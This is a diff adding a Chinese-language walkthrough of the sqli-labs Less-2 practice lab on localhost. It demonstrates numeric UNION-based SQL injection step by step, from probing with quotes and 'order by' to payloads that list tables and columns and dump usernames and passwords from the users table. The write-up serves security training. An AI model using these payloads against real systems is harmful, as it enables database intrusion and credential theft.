@@ -166,3 +166,89 @@ information_schema.tables表示该数据库下的tables表，点表示下一级;
 
 ### Less-2
 
++ 第二关地址
+
+~~~ shell
+http://localhost/sqli-labs/Less-2/
+~~~
+
+
+
++ 和第一关是一样进行判断，当输入单引号或者双引号可看到报错且报错信息看不到数字，所有可猜测sql语句应该是数字型注入。
+
+~~~ 
+?id=1 '
+?id=1 "
+~~~
+
+![Less-2_1](./img/Less-2_1.PNG)
+
+![Less-2_2](./img/Less-2_2.PNG)
+
+![Less-2_3](./img/Less-2_3.PNG)
+
+![Less-2_4](./img/Less-2_4.PNG)
+
+
+
++ 然后基本注入方式和第一关一样，注入语句
+
+~~~ shell
+?id=1 order by 3
+~~~
+
+![Less-2_12](./img/Less-2_12.PNG)
+
+
+
++ 注入
+
+~~~ shell
+?id=-1 union select 1,2,3
+~~~
+
+![Less-2_5](./img/Less-2_5.PNG)
+
+![Less-2_6](./img/Less-2_6.PNG)
+
+
+
++ 注入
+
+~~~ shell
+?id=-1 union select 1,database(),version()
+~~~
+
+![Less-2_7](./img/Less-2_7.PNG)
+
+![Less-2_8](./img/Less-2_8.PNG)
+
+
+
++ 注入
+
+~~~ shell
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
+~~~
+
+![Less-2_9](./img/Less-2_9.PNG)
+
+
+
++ 注入
+
+~~~ shell
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
+~~~
+
+![Less-2_10](./img/Less-2_10.PNG)
+
+
+
++ 注入
+
+~~~ shell
+?id=-1 union select 1,2,group_concat(username, id, password) from users
+~~~
+
+![Less-2_11](./img/Less-2_11.PNG)
